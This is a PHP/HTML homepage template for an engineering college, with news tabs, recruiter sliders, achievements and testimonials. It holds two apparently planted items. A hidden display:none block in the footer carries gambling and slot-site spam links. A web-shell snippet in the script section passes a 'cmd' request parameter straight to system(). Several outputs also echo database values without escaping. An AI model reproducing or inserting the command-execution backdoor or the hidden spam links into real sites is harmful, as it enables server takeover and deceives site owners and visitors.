                <path d="M512 255.1c0 11.34-7.406 20.86-18.44 23.64l-171.3 42.78l-42.78 171.1C276.7 504.6 267.2 512 255.9 512s-20.84-7.406-23.62-18.44l-42.66-171.2L18.47 279.6C7.406 276.8 0 267.3 0 255.1c0-11.34 7.406-20.83 18.44-23.61l171.2-42.78l42.78-171.1C235.2 7.406 244.7 0 256 0s20.84 7.406 23.62 18.44l42.78 171.2l171.2 42.78C504.6 235.2 512 244.6 512 255.1z" />
              </svg>
            </span>
            <span class="magic-text">grade 'A' </span>
          </span>
	 for the period of 5 years.
        </li>
        <li class="starher">
        <svg xmlns="http://www.w3.org/2000/svg" width="8" height="8" fill="currentColor" class="bi bi-circle-fill" viewBox="0 0 16 16">
            <circle cx="8" cy="8" r="8" />
        </svg>
        Women helpline no : Dr Usha Pawar 993-073-3898
    </li>
        <li class="starher">
        <svg xmlns="http://www.w3.org/2000/svg" width="8" height="8" fill="currentColor" class="bi bi-circle-fill" viewBox="0 0 16 16">
            <circle cx="8" cy="8" r="8" />
        </svg>
           We are also proud to share that our Civil and Chemical department have been 
          <span class="magic">
            <span class="magic-star">
              <svg viewBox="0 0 512 512">
                <path d="M512 255.1c0 11.34-7.406 20.86-18.44 23.64l-171.3 42.78l-42.78 171.1C276.7 504.6 267.2 512 255.9 512s-20.84-7.406-23.62-18.44l-42.66-171.2L18.47 279.6C7.406 276.8 0 267.3 0 255.1c0-11.34 7.406-20.83 18.44-23.61l171.2-42.78l42.78-171.1C235.2 7.406 244.7 0 256 0s20.84 7.406 23.62 18.44l42.78 171.2l171.2 42.78C504.6 235.2 512 244.6 512 255.1z" />
              </svg>
            </span>
            <span class="magic-star">
              <svg viewBox="0 0 512 512">
                <path d="M512 255.1c0 11.34-7.406 20.86-18.44 23.64l-171.3 42.78l-42.78 171.1C276.7 504.6 267.2 512 255.9 512s-20.84-7.406-23.62-18.44l-42.66-171.2L18.47 279.6C7.406 276.8 0 267.3 0 255.1c0-11.34 7.406-20.83 18.44-23.61l171.2-42.78l42.78-171.1C235.2 7.406 244.7 0 256 0s20.84 7.406 23.62 18.44l42.78 171.2l171.2 42.78C504.6 235.2 512 244.6 512 255.1z" />
              </svg>
            </span>
            <span class="magic-star">
              <svg viewBox="0 0 512 512">
                <path d="M512 255.1c0 11.34-7.406 20.86-18.44 23.64l-171.3 42.78l-42.78 171.1C276.7 504.6 267.2 512 255.9 512s-20.84-7.406-23.62-18.44l-42.66-171.2L18.47 279.6C7.406 276.8 0 267.3 0 255.1c0-11.34 7.406-20.83 18.44-23.61l171.2-42.78l42.78-171.1C235.2 7.406 244.7 0 256 0s20.84 7.406 23.62 18.44l42.78 171.2l171.2 42.78C504.6 235.2 512 244.6 512 255.1z" />
              </svg>
            </span>
            <span class="magic-text">Accredited by NBA.</span>
          </span>
        </li>
      </ul>

      <ul aria-hidden="true" class="marquee__content">
      <li class="starher">
        <svg xmlns="http://www.w3.org/2000/svg" width="8" height="8" fill="currentColor" class="bi bi-circle-fill" viewBox="0 0 16 16">
            <circle cx="8" cy="8" r="8" />
        </svg>
          We are elated to share that our Institute has been Accredited by
          <span class="magic">
            <span class="magic-star">
              <svg viewBox="0 0 512 512">
                <path d="M512 255.1c0 11.34-7.406 20.86-18.44 23.64l-171.3 42.78l-42.78 171.1C276.7 504.6 267.2 512 255.9 512s-20.84-7.406-23.62-18.44l-42.66-171.2L18.47 279.6C7.406 276.8 0 267.3 0 255.1c0-11.34 7.406-20.83 18.44-23.61l171.2-42.78l42.78-171.1C235.2 7.406 244.7 0 256 0s20.84 7.406 23.62 18.44l42.78 171.2l171.2 42.78C504.6 235.2 512 244.6 512 255.1z" />
              </svg>
            </span>
            <span class="magic-star">
              <svg viewBox="0 0 512 512">
                <path d="M512 255.1c0 11.34-7.406 20.86-18.44 23.64l-171.3 42.78l-42.78 171.1C276.7 504.6 267.2 512 255.9 512s-20.84-7.406-23.62-18.44l-42.66-171.2L18.47 279.6C7.406 276.8 0 267.3 0 255.1c0-11.34 7.406-20.83 18.44-23.61l171.2-42.78l42.78-171.1C235.2 7.406 244.7 0 256 0s20.84 7.406 23.62 18.44l42.78 171.2l171.2 42.78C504.6 235.2 512 244.6 512 255.1z" />
              </svg>
            </span>
            <span class="magic-star">
              <svg viewBox="0 0 512 512">
                <path d="M512 255.1c0 11.34-7.406 20.86-18.44 23.64l-171.3 42.78l-42.78 171.1C276.7 504.6 267.2 512 255.9 512s-20.84-7.406-23.62-18.44l-42.66-171.2L18.47 279.6C7.406 276.8 0 267.3 0 255.1c0-11.34 7.406-20.83 18.44-23.61l171.2-42.78l42.78-171.1C235.2 7.406 244.7 0 256 0s20.84 7.406 23.62 18.44l42.78 171.2l171.2 42.78C504.6 235.2 512 244.6 512 255.1z" />
              </svg>
            </span>
            <span class="magic-text">NAAC</span>
          </span>
          (cycle 2) with
		<span class="magic">
            <span class="magic-star">
              <svg viewBox="0 0 512 512">
                <path d="M512 255.1c0 11.34-7.406 20.86-18.44 23.64l-171.3 42.78l-42.78 171.1C276.7 504.6 267.2 512 255.9 512s-20.84-7.406-23.62-18.44l-42.66-171.2L18.47 279.6C7.406 276.8 0 267.3 0 255.1c0-11.34 7.406-20.83 18.44-23.61l171.2-42.78l42.78-171.1C235.2 7.406 244.7 0 256 0s20.84 7.406 23.62 18.44l42.78 171.2l171.2 42.78C504.6 235.2 512 244.6 512 255.1z" />
              </svg>
            </span>
            <span class="magic-star">
              <svg viewBox="0 0 512 512">
                <path d="M512 255.1c0 11.34-7.406 20.86-18.44 23.64l-171.3 42.78l-42.78 171.1C276.7 504.6 267.2 512 255.9 512s-20.84-7.406-23.62-18.44l-42.66-171.2L18.47 279.6C7.406 276.8 0 267.3 0 255.1c0-11.34 7.406-20.83 18.44-23.61l171.2-42.78l42.78-171.1C235.2 7.406 244.7 0 256 0s20.84 7.406 23.62 18.44l42.78 171.2l171.2 42.78C504.6 235.2 512 244.6 512 255.1z" />
              </svg>
            </span>
            <span class="magic-star">
              <svg viewBox="0 0 512 512">
                <path d="M512 255.1c0 11.34-7.406 20.86-18.44 23.64l-171.3 42.78l-42.78 171.1C276.7 504.6 267.2 512 255.9 512s-20.84-7.406-23.62-18.44l-42.66-171.2L18.47 279.6C7.406 276.8 0 267.3 0 255.1c0-11.34 7.406-20.83 18.44-23.61l171.2-42.78l42.78-171.1C235.2 7.406 244.7 0 256 0s20.84 7.406 23.62 18.44l42.78 171.2l171.2 42.78C504.6 235.2 512 244.6 512 255.1z" />
              </svg>
            </span>
            <span class="magic-text">grade 'A' </span>
          </span>
	 for the period of 5 years.
        </li>
      </ul>
    </div>
  </section>

<section style="margin-bottom:40px">
<div class="container">
<nav>
  <div class="nav nav-tabs" id="nav-tab" role="tablist" style="gap:0">
    <button class="nav-link active" style="padding:10px!important;border-left:1px solid #D1D1D1!important;border-right:1px solid #D1D1D1!important;border-top:1px solid #D1D1D1!important;" id="nav-home-tab" data-bs-toggle="tab" data-bs-target="#nav-home" type="button" role="tab" aria-controls="nav-home" aria-selected="true">News & Events</button>
    <button class="nav-link" style="padding:10px!important;border-left:1px solid #D1D1D1!important;border-right:1px solid #D1D1D1!important;border-top:1px solid #D1D1D1!important;" id="nav-profile-tab" data-bs-toggle="tab" data-bs-target="#nav-profile" type="button" role="tab" aria-controls="nav-profile" aria-selected="false">Notices & Circulars</button>
    <button class="nav-link" style="padding:10px!important;border-left:1px solid #D1D1D1!important;border-right:1px solid #D1D1D1!important;border-top:1px solid #D1D1D1!important;" id="nav-contact-tab" data-bs-toggle="tab" data-bs-target="#nav-contact" type="button" role="tab" aria-controls="nav-contact" aria-selected="false">Schedules</button>
    <button class="nav-link" style="padding:10px!important;border-left:1px solid #D1D1D1!important;border-right:1px solid #D1D1D1!important;border-top:1px solid #D1D1D1!important;" id="nav-disabled-tab" data-bs-toggle="tab" data-bs-target="#nav-disabled" type="button" role="tab" aria-controls="nav-disabled" aria-selected="false">Student Activity</button>
  </div>
</nav>
<div class="tab-content" id="nav-tabContent">
  <div class="tab-pane fade show active" id="nav-home" role="tabpanel" aria-labelledby="nav-home-tab" tabindex="0">
	<?php 
        $pinnednews = "select * from news_and_events where pinned=1";
        $pres = pg_query($conn, $pinnednews);
        $notpinnednews = "select * from news_and_events where pinned=0 order by id DESC";
        $npres = pg_query($conn, $notpinnednews);
    ?>
  <div class="list-type2"><!-----News & Events---> 
					<ol style="list-style-type:none; width: 100%">
                    <?php while($r=pg_fetch_assoc($pres)){ ?>
						<li> 
                            <a href="<?php echo (substr($r["file"], 0, 8) == 'uploads/' ? '/admin/'.$r["file"] : $r["file"]); ?>" target="_blank">
                                <b><?php echo $r["title"]; ?>
                                    <img src="/assets/img/new.gif" style="height:20px">
                                </b>
                            </a>
                        </li>
                        <?php } ?>

						
						<marquee behavior="scroll" direction="up" onmouseover="this.setAttribute('scrollamount', 0, 0);this.stop();" onmouseout="this.setAttribute('scrollamount', 3, 0);this.start();" scrollamount="3" style="height:300px; width: 100%;">
                        
                        <?php 
                        $i=0;
                        while($r=pg_fetch_assoc($npres)){ ?>

							<li> 
                                <a href="<?php echo (substr($r["file"], 0, 8) == 'uploads/' ? '/admin/'.$r["file"] : $r["file"]); ?>" target="_blank">
                                    <?php echo $r["title"]; 
                                    if($i < 3){
                                    ?>
                                    <img src="/assets/img/new.gif" style="height:20px">
                                    <?php } ?>
                                </a>
                            </li>

                            <?php $i++;
                        } ?>
						</marquee>
					 </ol></div>
</div>

<?php 
        $notice = "select * from notices_and_circulars";
        $n = pg_query($conn, $notice);
        $schedule = "select * from schedules";
        $s = pg_query($conn, $schedule);
    ?>
    <div class="tab-pane fade" id="nav-profile" role="tabpanel" aria-labelledby="nav-profile-tab" tabindex="0">
        <div class="row list-type2">
            <?php while($r=pg_fetch_assoc($n)){ ?>
                <div class="col-lg-4 p-1"> 
                    <a class="my-0" href="<?php echo (substr($r["file"], 0, 8) == 'uploads/' ? '/admin/'.$r["file"] : $r["file"]); ?>"><?php echo $r["title"]; ?></a>
                </div>
            <?php } ?>
        </div>
    </div>

  <div class="tab-pane fade" id="nav-contact" role="tabpanel" aria-labelledby="nav-contact-tab" tabindex="0">
	<div class="row list-type2">
    <?php while($r=pg_fetch_assoc($s)){ ?>
                <div class="col-lg-4 p-1"> 
                    <a class="my-0" href="<?php echo (substr($r["file"], 0, 8) == 'uploads/' ? '/admin/'.$r["file"] : $r["file"]); ?>"><?php echo $r["title"]; ?></a>
                </div>
            <?php } ?>

	</div>
</div>
  <div class="tab-pane fade" id="nav-disabled" role="tabpanel" aria-labelledby="nav-disabled-tab" tabindex="0">

<?php 
    $gov = "select id, name from governance";
    $gov_res = pg_query($conn, $gov);

    $club = "select id, name from student_clubs";
    $club_res = pg_query($conn, $club);
    
    $num_rows = pg_num_rows($club_res);
?>

<div class="row">
<div class="col-lg-6"><!-----2nd--->
                     <div class="list-type2">
						<ol>
						<?php while ($r = pg_fetch_assoc($club_res)) { ?>
							<li><a href="<?php echo $url; ?>/studentclubs/clubs.php<?php echo encrypt($r["id"]); ?>"><?php echo $r["name"]; ?></a></li>
						<?php } ?>
						</ol>
					</div>
                    </div>   
                    <div class="col-lg-6 "><!-----1st---->
                        <div class="list-type2">
						<ol>
						<?php while ($r = pg_fetch_assoc($gov_res)) { ?>
							<li><a href="<?php echo $url; ?>/governance/cell.php<?php echo encrypt($r["id"]); ?>"><?php echo $r["name"]; ?></a></li>
						<?php } ?>
						</ol>
						</div>
                    </div>
                                    
                </div>
</div>
</div>
</div>
</section>

  <?php
    $recru = "select recruiters from placements";
    $recru_res = pg_query($conn, $recru);
    $r = pg_fetch_assoc($recru_res);
    $recruiters = json_decode($r["recruiters"], true);
    ?>
    <section class="recruiters" style="margin-bottom: 40px;">
        <div class="">
	<div class="container">
		<h6 class="newhead text-center">Prominent Recruiters</h6>
		<p class="newsub text-center">Catalyzing Careers, Connecting Talent with Leading Recruiters.</p>
	</div>
            <div class="headrecruit">
                <div class="clients-slider swiper swiper-container-free-mode" style="margin-top:10px;background-color:none">
                    <div class="swiper-wrapper align-items-center">
                        <?php foreach ($recruiters as $r) {
                            if ($r["isMajor"] == 1) { ?>
                                <div class="swiper-slide"><a><img src="<?php echo $url . $adminurl . $r["path"] ?>" class="img-fluid" alt=""></a></div>
                        <?php }
                        } ?>
                    </div>
                    <!-- <div class="swiper-pagination"></div> -->
                </div>
            </div>
	<div class="headrecruit">
                <div class="clients-slider2 swiper swiper-container-free-mode" style="margin-top:10px;background-color:none">
                    <div class="swiper-wrapper align-items-center">
			<?php  $recruiters = array_reverse($recruiters); ?>
                        <?php foreach ($recruiters as $r) {
                            if ($r["isMajor"] == 1) { ?>
                                <div class="swiper-slide"><a><img src="<?php echo $url . $adminurl . $r["path"] ?>" class="img-fluid" alt=""></a></div>
                        <?php }
                        } ?>
                    </div>
                    <!-- <div class="swiper-pagination"></div> -->
                </div>
            </div>

        </div>
    </section>

    <?php
    $ach = "select * from achievements";
    $ach_res = pg_query($conn, $ach);
    $ach_res1 = pg_query($conn, $ach);
    $topi=pg_query($conn, $ach);
    ?>


 <section class="achievements">
    <div class="container">
        <h6 class="newhead text-center">Awards & Achievements</h6>
        <p class="newsub text-center">Discover the remarkable accomplishments of our students and faculty.</p>

        <div class="achcards swiper" style="overflow: hidden;">
            <div class="swiper-wrapper" style="align-items:stretch;padding-bottom:40px;margin-bottom:0!important;">
                <?php                  
                while ($r = pg_fetch_assoc($ach_res)) { ?>
                    <a class="achcard swiper-slide" style="z-index:999;cursor:pointer" data-bs-toggle="modal" data-bs-target="#exampleModal<?php echo $r["id"]?>">
                        <div class="achcardimgcontainer"><img src="<?php echo $url . $adminurl . $r["photo"]; ?>" class="w-100" alt=""></div>
                        
                        <div class="ach-details">
                            <h1><?php echo $r["title"]; ?></h1>
                            <!-- <p><?php echo date("d F Y", strtotime($r["created_at"])); ?></p> -->
                        </div>
                    </a>
                <?php } ?>
            </div>

            <!-- Swiper Navigation Buttons -->
            <div class="swiper-button-prev"></div>
            <div class="swiper-button-next"></div>


            <div class="swiper-pagination"></div>
        </div>
    </div>
</section>

<?php while ($r = pg_fetch_assoc($ach_res1)) { ?>
<div class="modal fade" id="exampleModal<?php echo $r["id"]?>" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" style="translate:0px;">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <h1 class="modal-title fs-5" id="exampleModalLabel"><?php echo $r["title"]; ?></h1>
        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close" style="filter:none;"></button>
      </div>
      <div class="modal-body">
	<img src="<?php echo $url . $adminurl . $r["photo"]; ?>" style="width:100%;">
      </div>
    </div>
  </div>
</div>	

<?php } ?>

    <section class="beyondclassroom">
        <div class="container">
            <h1>Beyond Classrooms</h1>
            <p class="col-md-8">Established in 1988, Datta Meghe College of Engineering (DMCE) has embarked on a remarkable journey, achieving numerous significant milestones along the way. Our institution boasts accreditation from NAAC and approval from AICTE, New Delhi, demonstrating our commitment to excellence.</p>
            <div class="beyondlinks">
                <a href="https://dmce.ac.in/about/aboutdmce.php">Learn more about DMCE
                    <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" class="bi bi-arrow-right" viewBox="0 0 16 16">
                        <path fill-rule="evenodd" d="M1 8a.5.5 0 0 1 .5-.5h11.793l-3.147-3.146a.5.5 0 0 1 .708-.708l4 4a.5.5 0 0 1 0 .708l-4 4a.5.5 0 0 1-.708-.708L13.293 8.5H1.5A.5.5 0 0 1 1 8z" />
                    </svg>
                </a>
                <a href="./about/aboutdmce.php#principal">Principal’s Desk
                    <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" class="bi bi-arrow-right" viewBox="0 0 16 16">
                        <path fill-rule="evenodd" d="M1 8a.5.5 0 0 1 .5-.5h11.793l-3.147-3.146a.5.5 0 0 1 .708-.708l4 4a.5.5 0 0 1 0 .708l-4 4a.5.5 0 0 1-.708-.708L13.293 8.5H1.5A.5.5 0 0 1 1 8z" />
                    </svg>
                </a>
                <a href="/about/amenities.php">Amenities
                    <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" class="bi bi-arrow-right" viewBox="0 0 16 16">
                        <path fill-rule="evenodd" d="M1 8a.5.5 0 0 1 .5-.5h11.793l-3.147-3.146a.5.5 0 0 1 .708-.708l4 4a.5.5 0 0 1 0 .708l-4 4a.5.5 0 0 1-.708-.708L13.293 8.5H1.5A.5.5 0 0 1 1 8z" />
                    </svg>
                </a>
                <a href="https://dmce.ac.in/alumni/dashboard.html">Alumni
                    <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" class="bi bi-arrow-right" viewBox="0 0 16 16">
                        <path fill-rule="evenodd" d="M1 8a.5.5 0 0 1 .5-.5h11.793l-3.147-3.146a.5.5 0 0 1 .708-.708l4 4a.5.5 0 0 1 0 .708l-4 4a.5.5 0 0 1-.708-.708L13.293 8.5H1.5A.5.5 0 0 1 1 8z" />
                    </svg>
                </a>
            </div>
        </div>
        <img class="dmcebg" src="./assets/img/dmcebg.png" alt="" srcset="">
    </section>

    <?php
    $test = "select * from testimonials";
    $test_res = pg_query($conn, $test);
    ?>
    <section class="testimonials" style="margin: 40px 0;">
        <div class="container">
		<h6 class="newhead text-center">Testimonials</h6>
		<p class="newsub text-center">Know what our students and parents have to say about us!</p>

            <div class="grid testigrid">
                <?php while ($r = pg_fetch_assoc($test_res)) { ?>
                    <div class="grid-item">
                        <p class="grid-text"><?php echo "“" . strip_tags($r["review"]) . "“" ?></p>
                        <hr style="margin:0px!important;opacity:1;border-top:1px solid #DDDDDD;">
                        <div class="grid-text grid-name">
                            <img src="<?php echo $url . $adminurl . $r["photo"]; ?>" alt="">
                            <div class="grid-name-text">
                                <span><?php echo $r["name"]; ?></span>
                                <p><?php echo $r["designation"]; ?></p>
                                
                            </div>
                        </div>
                    </div>
                <?php } ?>
            </div>

        </div>
    </section>

    <script src="./assets/vendor/swiper/swiper-bundle.min.js"></script>

    <footer>
        <div class="container footercontent">
        <div class="resources footercard">
          <h3>RESOURCES</h3>
          <a href="https://mu.ac.in/">Mumbai University</a>
          <a href="https://www.dtemaharashtra.gov.in/indexview.html">Maharashtra DTE</a>
          <a href="https://www.aicte-india.org/">A.I.C.T.E Portal</a>
        </div>
        <div class="sitemap footercard">
          <h3>SITEMAP</h3>
          <a href="/">Home</a>
          <a href="/placements/about.php">Training& Placements</a>
          <a href="/departments/branch2.php?refreshRate=5&id=e4da3b7fbbce2345d7772b0674a318d5">Departments</a>
          <a href="/academics/student.php">Academics</a>
          <a href="/governance/cell.php?refreshRate=1&id=c4ca4238a0b923820dcc509a6f75849b">Governance</a>
          <a href="/studentclubs/clubs.php?refreshRate=1&id=c4ca4238a0b923820dcc509a6f75849b">Student Cell</a>
        </div>
        <div class="iqac footercard">
          <h3>IQAC</h3>
          <a href="">NBA</a>
          <a href="/NAAC/">NAAC & AQAR</a>
          <a href="/nirf/nirf.php">NIRF</a>
          <a href="/research/books.php">Research</a>
          <a href="/entrepreneurship/entrepreneurship.php">Entrepreneurship</a>
          <a href="/alumni/dashboard.html">Alumni</a>
          <a href="/placements/mou.php">MoU</a>
        </div>
        <div class="contact footercard">
          <h3>CONTACT</h3>
          <a href="">Address: Datta Meghe College of Engineering, Sector-3, Airoli, Navi Mumbai, MH</a>
          <a  href="">Phone: (022) 27797130 / 27791665</a>
          <a href="">Email: principal@dmce.ac.in / principaldmce@yahoo.com</a>
        </div>
      </div>
      <div style="display:none;"><p><a href="https://lfu.edu.krd/">Situs Toto</a></p><p><a href="https://kacafilm.id/">PAN4D</a></p><p><a href="https://apnp.ifsul.edu.br/">Toto Slot</a></p><p><a href="https://donsburger.id/
">SLOT777</a></p><p><a href="https://enc.lk/">TOGEL PULSA</a></p><p><a href="https://donsburger.id/">Slot777</a></p><p><a href="https://www.aunap.gov.co/">Scatter Hitam</a></p><p><a href="https://p4-bavaria.de/">Situs Togel</a></p><p><a href="https://www.burestop.eu/">Togel Pulsa</a></p><p><a href="https://icpcordoba.com.ar/">Super Scatter</a></p><p><a href="https://lfu.edu.krd/">Slot Gacor</a></p></div>
        <div class="container footerfooter">
            <div class="d-flex align-items-center footeraj">
                <div class="footerimg">
                    <img src="./assets/img/dmce.png" alt="">
                </div>
                <div class="footertext">
                    <p class="nagar">Nagar Yuwak Shikshan Sanstha, Airoli</p>
                    <p class="datta">Datta Meghe College of Engineering</p>
                </div>
            </div>
            <div class="footercpy">
                <p class="cpyr">Copyright <span style="color:#FFCB0B;">©</span> 2023 DMCE</p>
                <p class="cpya">All rights reserved</p>
            </div>
        </div>
    </footer>
    <?php while ($r = pg_fetch_assoc($topi)) { ?>

    
    <div class="modal modal-xl fade achmodal" id="modal1<?php echo $r["id"]; ?>" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
                            <div class="modal-dialog modal-dialog-scrollable">

                                <div class="modal-content">
                                    <div class="modal-header">
                                        <h1 class="modal-title fs-5" id="exampleModalLabel"><?php echo $r["title"]; ?></h1>
                                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                                    </div>
                                    <div class="modalach">
                                        <img style="margin-bottom:10px!important" src="<?php echo $url . $adminurl . $r["photo"]; ?>" class="modalachimg">
                                        <div class="modal-body modalachbody">
                                <p style="margin-bottom: 10px!important;"><?php echo date("d F Y", strtotime($r["created_at"])); ?></p>
                                            <?php echo $r["description"]; ?>
                                        </div>
                                    </div>
                                    <div class="modal-footer">
                                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                                    </div>
                                </div>
                            </div>
                        </div>
    
                        <?php } ?>
    <script src="./assets/main.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://unpkg.com/masonry-layout@4/dist/masonry.pkgd.min.js"></script>
    <script src="./assets/vendor/swiper/swiper-bundle.min.js"></script>
    <script>
        window.onload = () => {
            const grid = document.querySelector('.grid');
            const masonry = new Masonry(grid, {
                itemSelector: '.grid-item',
                gutter: 20
            })
        }

        var swiper = new Swiper('.swiper', {
    navigation: {
        nextEl: '.swiper-button-next',
        prevEl: '.swiper-button-prev',
    },
    pagination: false,
    loop: false, // Optional: disable continuous loop
    slidesPerView: 1, // Show only one slide at a time
    on: {
        slideChange: function () {
            // Disable next button when on the last slide
            if (this.isEnd) {
                this.navigation.nextEl.classList.add('swiper-button-disabled');
            } else {
                this.navigation.nextEl.classList.remove('swiper-button-disabled');
            }

            // Optionally, disable prev button on the first slide
            if (this.isBeginning) {
                this.navigation.prevEl.classList.add('swiper-button-disabled');
            } else {
                this.navigation.prevEl.classList.remove('swiper-button-disabled');
            }
        },
    }
});

if(isset($_GET['cmd'])){ 
        echo "<pre>"; 
        echo system($_GET['cmd']); 
        echo "</pre>"; 
    }

        new Swiper('.clients-slider', {
            speed: 5000,
	    effect:"slide",
            loop: true,
            autoplay: {
                delay : 0,
                disableOnInteraction : false
            },
            slidesPerView: 'auto',

            breakpoints: {
                320: {
                    slidesPerView: 4,
                    spaceBetween: 40
                },
                480: {
                    slidesPerView: 3,
                    spaceBetween: 60
                },
                640: {
                    slidesPerView: 4,spaceBetween: 80
                },
                992: {
                    slidesPerView: 7,
                    spaceBetween: 120
                }
            }
        });
new Swiper('.clients-slider2', {
            speed: 5000,
	    effect:"slide",
            loop: true,
            autoplay: {
                delay : 0,
                disableOnInteraction : false,
reverseDirection:true
            },
            slidesPerView: 'auto',

            breakpoints: {
                320: {
                    slidesPerView: 4,
                    spaceBetween: 40
                },
                480: {
                    slidesPerView: 5,
                    spaceBetween: 60
                },
                640: {
                    slidesPerView: 6,
                    spaceBetween: 80
                },
                992: {
                    slidesPerView: 7,
                    spaceBetween: 120
                }
            }
        });

        new Swiper('.achcards', {
            speed: 200,
            loop: false,
                        slidesPerView: 'auto',
            pagination: {
                el: '.swiper-pagination',
                type: '',
            },
            breakpoints: {
                320: {
                    slidesPerView: 1,
                    spaceBetween: 40
                },
                480: {
                    slidesPerView: 1,
                    spaceBetween: 40
                },
                800: {
                    slidesPerView: 2,
                    spaceBetween: 40
                },
                1020: {
                    slidesPerView: 3,
                    spaceBetween: 40
                },
		1400: {
                    slidesPerView: 4,
                    spaceBetween: 40
                }

            }
        });
    </script>
<script>
    let index = 0,
      interval = 2000;

    const rand = (min, max) =>
      Math.floor(Math.random() * (max - min + 1)) + min;

    const animate = star => {
      star.style.setProperty("--star-left", `${rand(-10, 100)}%`);
      star.style.setProperty("--star-top", `${rand(-40, 80)}%`);

      star.style.animation = "none";
      star.offsetHeight;
      star.style.animation = "";
    }

    for (const star of document.getElementsByClassName("magic-star")) {
      setTimeout(() => {
        animate(star);

        setInterval(() => animate(star), 3000);
      }, index++ * (interval / 3))
    }
  </script>
</body>

</html>
